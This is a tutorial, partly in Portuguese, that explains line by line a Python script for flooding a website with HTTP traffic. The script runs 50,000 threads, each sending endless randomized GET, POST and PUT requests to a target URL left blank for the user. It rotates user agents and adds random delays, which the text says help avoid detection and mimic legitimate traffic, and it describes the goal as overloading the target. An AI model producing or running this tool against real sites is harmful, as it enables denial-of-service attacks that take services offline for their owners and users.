### Importação de Bibliotecas

```python
import requests
import random
import string
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

```

- **import requests**: Imports the `requests`, library, which is a powerful and easy-to-use tool for making HTTP requests in Python.
- **import random**: Imports the `random`, library, which contains functions to generate random numbers and perform random selections, useful for simulating varied data.
- **import string**: Imports the `string`, library, which provides a set of useful constants such as `ascii_letters` (all alphabet letters) and `digits` (all digits from 0 to 9), used to create random strings.
- **import time**: Imports the `time`, library, used to control timing and introduce delays in operations, helping to mimic legitimate traffic.
- **from concurrent.futures import ThreadPoolExecutor, as_completed**: Imports `ThreadPoolExecutor` and `as_completed` from the `concurrent.futures` library, which are used to manage concurrent thread execution, allowing multiple tasks to run in parallel.
- 
### Definition of Variables and Constants

```python
# Target URL
url = ""

# List of user agents to rotate
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/92.0.902.78 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
]

```

- **url = ""**: Declares a variable `url` that should be filled with the target URL for the requests.
- **user_agents**: A list of different `User-Agent` strings. Each string represents a different browser and operating system. This is used to simulate requests from different sources, helping to avoid request pattern–based blocking.

### Helper Functions

### Random Parameter Generation

```python
def generate_random_query():
    query = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    return {query: query}

```

- **def generate_random_query():** Defines a function named `generate_random_query` that does not receive any arguments.
- **query = ''.join(random.choices(string.ascii_letters + string.digits, k=8))**: Creates a random string of 8 characters composed of letters (uppercase and lowercase) and digits. The `random.choices()` function randomly selects 8 characters from the combination of `string.ascii_letters` and `string.digits`, and `''.join()` concatenates them into a single string.
- **return {query: query}**: Returns a dictionary where both the key and the value are the generated random string. This is used as query parameters for GET requests.
- 

The `generate_random_query` function is defined without arguments because its sole responsibility is to generate a random string and return a dictionary using that string as both key and value. Below is a breakdown of why there is no need for arguments in this function:

### Function Objective

The main objective of the function is to generate a random string and structure it into a dictionary. There is no need for external information or additional inputs to perform this task.

### Simplicity

Keeping the function without arguments simplifies its usage and invocation. The function can be called directly without the need to provide parameters, making it easy to use in different contexts.

### Usage Example

```python
# Suponha que precisamos gerar várias consultas aleatórias
for _ in range(5):
    random_query = generate_random_query()
    print(random_query)

```

Here, the `generate_random_query` function is called five times to generate five random queries, and on each call it creates a random string without the need for additional arguments.

### Flexibility

### Random Data Generation

```python
def generate_random_data():
    return {
        ''.join(random.choices(string.ascii_letters, k=5)): ''.join(random.choices(string.ascii_letters + string.digits, k=10))
        for _ in range(5)
    }

```

- **def generate_random_data():** Defines a function named `generate_random_data` that does not receive any arguments.
- **return {...}**: Returns a dictionary.
- **''.join(random.choices(string.ascii_letters, k=5))**: Creates a dictionary key composed of 5 random letters.
- **''.join(random.choices(string.ascii_letters + string.digits, k=10))**: Creates a dictionary value composed of 10 random alphanumeric characters.
- **for _ in range(5)**: Repeats the process 5 times to generate a dictionary with 5 key-value pairs. Each pair is generated independently, resulting in varied form data.

### Request Sending

```python
def send_request(url):
    while True:
        try:
            headers = {
                "User-Agent": random.choice(user_agents),
                "Referer": url
            }
            params = generate_random_query()
            data = generate_random_data()

            # Randomly choose the request type with higher probability for PUT and POST
            request_type = random.choices(['GET', 'POST', 'PUT'], weights=[1, 3, 3])[0]

            if request_type == 'GET':
                response = requests.get(url, headers=headers, params=params)
            elif request_type == 'POST':
                response = requests.post(url, headers=headers, data=data)
            elif request_type == 'PUT':
                response = requests.put(url, headers=headers, data=data)

            print(f"{request_type} request sent! Status code: {response.status_code}")
            time.sleep(random.uniform(0.5, 2.0))  # Adding delay to mimic legitimate traffic
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")
            break

```

- **def send_request(url):** Defines a function named `send_request` that takes a single argument, `url`.
- **while True:** Starts an infinite loop, allowing continuous request sending until an exception occurs.
- **try:** Begins a block of code that attempts to execute the instructions, enabling exception handling.
- **headers = {...}:** Defines a dictionary of HTTP headers for the request.
    - **"User-Agent": random.choice(user_agents):** Randomly selects a `User-Agent` from the `user_agents` list, simulating requests from different browsers.
    - **"Referer": url:** Sets the `Referer` header to the target URL, which helps simulate legitimate-looking requests.
- **params = generate_random_query():** Calls the `generate_random_query` function to obtain random query parameters.
- **data = generate_random_data():** Calls the `generate_random_data` function to obtain random form data.
- **request_type = random.choices(['GET', 'POST', 'PUT'], weights=[1, 3, 3])[0]:** Randomly selects a request type (`GET`, `POST` ou `PUT`) with higher probability assigned to `POST` and `PUT`.
- **if request_type == 'GET':** Checks if the selected request type is `GET`.
    - **response = requests.get(url, headers=headers, params=params):** Sends a `GET` request to the target URL with the defined headers and parameters.
- **elif request_type == 'POST':** Checks if the selected request type is `POST`.
    - **response = requests.post(url, headers=headers, data=data):** Sends a `POST` request to the target URL with the defined headers and data.
- **elif request_type == 'PUT':** Checks if the selected request type is `PUT`.
    - **response = requests.put(url, headers=headers, data=data):** Sends a `PUT` request to the target URL with the defined headers and data.
- **print(f"{request_type} request sent! Status code: {response.status_code}"):** Prints a message indicating the type of request sent and the status code of the received response.
- **time.sleep(random.uniform(0.5, 2.0)):** Introduces a random delay between 0.5 and 2.0 seconds, helping simulate legitimate traffic and avoid detection.
- **except requests.exceptions.RequestException as e:** Catches exceptions related to HTTP requests.
    - **print(f"Request failed: {e}"):** Prints a message indicating that the request failed and displays the exception.
    - **break:** Breaks the infinite loop in case of an exception, stopping further request execution.

### Main function

```python
def main():
    website_url = url  # Example URL that returns status 200
    num_threads = 50000

    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = [executor.submit(send_request, website_url) for _ in range(num_threads)]

        for future in as_completed(futures):
            future.result() #envia req uma por uma e só envia a proxima depois que a proxima for confirmada que enviou. e se acontecer algum erro no trajeto reenvia

if __name__ == "__main__":
    main()

```

Passing the **send_request** function and the website URL to the futures so that the thread pool knows which target to overload.

### Summary

- **`ThreadPoolExecutor`** manages a pool of threads for parallel execution.
- **`executor.submit()`** submits tasks to be executed by the threads in the pool.
- **`as_completed()`** allows processing task results as they are completed.
- **`future.result()`** retrieves the execution result or raises an exception if an error occurred.
- **`futures`**: A list of `Future` objects returned by `executor.submit(send_request, website_url)`. Each `Future` represents a request that has been submitted and is being processed.

### Iteration Over Completed Tasks

- **`for future in as_completed(futures):`**: This loop iterates over each `Future` as it completes. This means the loop processes requests in the order they finish, not in the order they were started.
    - The advantage of using `as_completed` is that you can begin processing request results as soon as they complete, without waiting for all of them to finish.

### Retrieving the Result

- **`future.result()`**: This method blocks until the `Future` is complete and then returns the result of the function that was submitted (in this case, `send_request`).
    - If the`send_request` function executed successfully, `result()` returns the value returned by `send_request` (the HTTP response content).
    - If the `send_request` function raised an exception, `result()` will re-raise that exception, allowing it to be handled in the context where `result()` was called.
- 
- 
- **def main():** Defines the main function `main` which orchestrates the execution of the code.

- **website_url = url:** Assigns the value of the `url` variable to the `website_url`. Evariable. This URL should be set to the target URL for the requests.
- **num_threads = 50000:** Defines the number of threads to be used.
- **with ThreadPoolExecutor(max_workers=num_threads) as executor:** Creates a `ThreadPoolExecutor` with the specified number of threads, allowing multiple tasks to run concurrently.
    - **futures = [executor.submit(send_request, website_url) for _ in range(num_threads)]:** Submits the `send_request` function to the executor to be executed across multiple threads, passing `website_url` as an argument. This creates a list of `Future` objects.
- **for future in as_completed(futures):** Iterates over the completed tasks.
    - **future.result():** Calls `result()` on each `Future`, which can be used to check for exceptions or task results. In this case, it blocks until all threads have completed.
